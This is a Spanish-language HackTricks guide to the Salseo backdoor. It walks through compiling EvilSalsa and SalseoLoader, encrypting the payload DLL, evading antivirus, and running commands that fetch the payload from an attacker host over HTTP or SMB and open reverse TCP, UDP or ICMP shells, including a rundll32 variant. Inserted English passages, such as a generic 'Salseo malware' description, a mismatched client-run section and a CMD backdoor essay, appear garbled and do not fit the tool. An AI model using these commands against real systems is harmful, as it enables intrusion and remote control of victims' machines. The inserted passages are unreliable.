# Salseo

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Compilando los binarios

Descarga el código fuente de GitHub y compila **EvilSalsa** y **SalseoLoader**. Necesitarás tener **Visual Studio** instalado para compilar el código.

Compila ambos proyectos para la arquitectura de la máquina Windows donde los vayas a utilizar (si Windows admite x64, compílalos para esa arquitectura).

Puedes **seleccionar la arquitectura** dentro de Visual Studio en la pestaña **"Build"** en **"Platform Target".**

(\*\*Si no encuentras estas opciones, presiona en **"Project Tab"** y luego en **"\<Project Name> Properties"**)

![](<../.gitbook/assets/image (132).png>)

Luego, compila ambos proyectos (Build -> Build Solution) (Dentro de los registros aparecerá la ruta del ejecutable):

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## Preparando la puerta trasera

En primer lugar, necesitarás codificar el **EvilSalsa.dll**. Para hacerlo, puedes usar el script de Python **encrypterassembly.py** o puedes compilar el proyecto **EncrypterAssembly**:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows

#### Salseo Backdoor

The Salseo backdoor is a type of malware that allows unauthorized access to a Windows system. It is designed to remain hidden and provide a remote attacker with control over the infected machine. The Salseo backdoor can be used to steal sensitive information, execute commands, and perform various malicious activities.

##### Installation

The Salseo backdoor can be installed on a target system through various methods, including:

- Email attachments: The malware can be disguised as a legitimate file attached to an email. When the user opens the attachment, the backdoor is installed silently in the background.

- Drive-by downloads: The backdoor can be downloaded and installed automatically when the user visits a compromised website.

- Exploiting vulnerabilities: The malware can exploit security vulnerabilities in the target system to gain unauthorized access and install the backdoor.

##### Functionality

Once installed, the Salseo backdoor provides the attacker with a wide range of capabilities, including:

- Remote access: The attacker can remotely control the infected system, allowing them to perform actions as if they were physically present.

- Keylogging: The backdoor can record keystrokes, allowing the attacker to capture sensitive information such as passwords and credit card numbers.

- File manipulation: The attacker can create, modify, or delete files on the infected system.

- Network reconnaissance: The backdoor can scan the network for other vulnerable systems or gather information about the target network.

- Data exfiltration: The attacker can steal sensitive data from the infected system and send it to a remote server.

##### Detection and Prevention

Detecting the Salseo backdoor can be challenging, as it is designed to remain hidden. However, there are some measures that can be taken to prevent infection:

- Keep software up to date: Regularly update the operating system and all installed software to patch any known vulnerabilities.

- Use strong passwords: Use complex and unique passwords for all accounts to make it harder for attackers to gain unauthorized access.

- Be cautious with email attachments: Avoid opening attachments from unknown or suspicious sources.

- Use reputable antivirus software: Install and regularly update antivirus software to detect and remove malware.

- Enable a firewall: Use a firewall to monitor and control incoming and outgoing network traffic.

By following these preventive measures, you can reduce the risk of infection by the Salseo backdoor and other similar malware.
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Ok, ahora tienes todo lo que necesitas para ejecutar todo el asunto de Salseo: el **EvilDalsa.dll codificado** y el **binario de SalseoLoader**.

**Sube el binario SalseoLoader.exe a la máquina. No deberían ser detectados por ningún AV...**

## **Ejecutar la puerta trasera**

### **Obtener una shell inversa TCP (descargando el dll codificado a través de HTTP)**

Recuerda iniciar un nc como el oyente de la shell inversa y un servidor HTTP para servir el evilsalsa codificado.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Obteniendo una shell inversa UDP (descargando un dll codificado a través de SMB)**

Recuerda iniciar un nc como oyente de la shell inversa y un servidor SMB para servir el evilsalsa codificado (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Obteniendo una shell inversa ICMP (dll codificada ya presente en la víctima)**

**Esta vez necesitarás una herramienta especial en el cliente para recibir la shell inversa. Descarga:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Desactivar respuestas ICMP:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Ejecutar el cliente:

To execute the client, you need to follow these steps:

1. Open a terminal window.
2. Navigate to the directory where the client is located.
3. Run the client executable by typing the command `./client`.

This will start the client and establish a connection with the server. Make sure to provide the necessary parameters, such as the server IP address and port number, if required.
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Dentro de la víctima, vamos a ejecutar el salseo:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Compilando SalseoLoader como DLL exportando la función principal

Abre el proyecto SalseoLoader usando Visual Studio.

### Agrega antes de la función principal: \[DllExport]

![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png>)

### Instala DllExport para este proyecto

#### **Herramientas** --> **Gestor de paquetes NuGet** --> **Administrar paquetes NuGet para la solución...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png>)

#### **Busca el paquete DllExport (usando la pestaña Examinar) y presiona Instalar (y acepta el mensaje emergente)**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1).png>)

En la carpeta de tu proyecto han aparecido los archivos: **DllExport.bat** y **DllExport\_Configure.bat**

### **Desinstala DllExport**

Presiona **Desinstalar** (sí, es extraño pero confía en mí, es necesario)

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### **Cierra Visual Studio y ejecuta DllExport\_configure**

Simplemente **cierra** Visual Studio

Luego, ve a tu carpeta **SalseoLoader** y **ejecuta DllExport\_Configure.bat**

Selecciona **x64** (si lo vas a usar en una máquina x64, ese fue mi caso), selecciona **System.Runtime.InteropServices** (dentro de **Namespace para DllExport**) y presiona **Aplicar**

![](<../.gitbook/assets/image (7) (1) (1) (1).png>)

### **Abre el proyecto nuevamente con Visual Studio**

**\[DllExport]** ya no debería estar marcado como error

![](<../.gitbook/assets/image (8) (1).png>)

### Compila la solución

Selecciona **Tipo de salida = Biblioteca de clases** (Proyecto --> Propiedades de SalseoLoader --> Aplicación --> Tipo de salida = Biblioteca de clases)

![](<../.gitbook/assets/image (10) (1).png>)

Selecciona la **plataforma x64** (Proyecto --> Propiedades de SalseoLoader --> Compilar --> Destino de la plataforma = x64)

![](<../.gitbook/assets/image (9) (1) (1).png>)

Para **compilar** la solución: Compilar --> Compilar solución (Dentro de la consola de salida aparecerá la ruta de la nueva DLL)

### Prueba la DLL generada

Copia y pega la DLL donde quieras probarla.

Ejecuta:
```
rundll32.exe SalseoLoader.dll,main
```
Si no aparece ningún error, ¡probablemente tienes una DLL funcional!

## Obtén una shell usando la DLL

No olvides usar un **servidor** **HTTP** y configurar un **escucha nc**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD

CMD (Command Prompt) is a command-line interpreter in Windows operating systems. It provides a text-based interface for executing commands and managing the system. CMD can be used to perform various tasks, such as navigating through directories, running programs, and managing files and processes.

CMD is a powerful tool for hackers as it allows them to execute commands and scripts on a target system. By gaining access to CMD, hackers can perform a wide range of activities, including reconnaissance, privilege escalation, and data exfiltration.

To exploit CMD, hackers often use backdoors to maintain persistent access to a compromised system. A backdoor is a hidden entry point that allows unauthorized access to a system. By installing a backdoor on a target system, hackers can bypass security measures and gain remote access at any time.

There are several methods to create a backdoor in CMD. One common technique is to modify the system's registry to execute a malicious script every time CMD is launched. Another method is to replace a legitimate system file with a malicious one, which will be executed when CMD is used.

To protect against CMD backdoors, it is important to regularly update and patch the operating system. Additionally, monitoring network traffic and using intrusion detection systems can help detect and prevent unauthorized access.

CMD is a valuable tool for both hackers and system administrators. Understanding its capabilities and vulnerabilities is essential for effective security management.
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
